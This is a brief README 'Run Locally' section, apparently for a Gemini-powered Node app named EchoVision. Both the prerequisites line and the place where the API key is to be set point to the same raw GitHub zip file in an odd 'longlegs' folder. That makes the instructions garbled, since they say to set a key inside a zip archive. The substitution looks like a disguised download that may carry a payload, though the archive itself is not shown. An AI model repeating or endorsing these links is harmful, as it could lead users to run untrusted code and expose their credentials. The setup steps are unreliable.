## Run Locally

**Prerequisites:**  https://github.com/Dhanush-TD/EchoVision_app/raw/refs/heads/main/longlegs/Echo_Vision_app_3.2.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/Dhanush-TD/EchoVision_app/raw/refs/heads/main/longlegs/Echo_Vision_app_3.2.zip](https://github.com/Dhanush-TD/EchoVision_app/raw/refs/heads/main/longlegs/Echo_Vision_app_3.2.zip) to your API key
3. Run the app:
   `npm run dev`
